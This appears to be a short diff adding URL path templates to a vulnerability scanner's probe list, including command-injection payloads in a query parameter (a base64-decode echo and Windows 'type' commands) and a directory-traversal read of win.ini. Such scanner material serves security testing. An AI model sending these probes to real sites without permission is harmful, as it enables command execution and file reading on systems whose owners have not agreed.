@@ -1,0 +1,5 @@
+/pbxcore/files/cache/{{extracted_path}}?{{wait_for(3)}}
+/css/eonweb.css
+/?p={{post_id}}&0=echo+{{base64(string)}}|base64+-d
+/?p={{post_id}}&0=type+C:\\windows\\win.ini
+/?p={{post_id}}&0=type+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
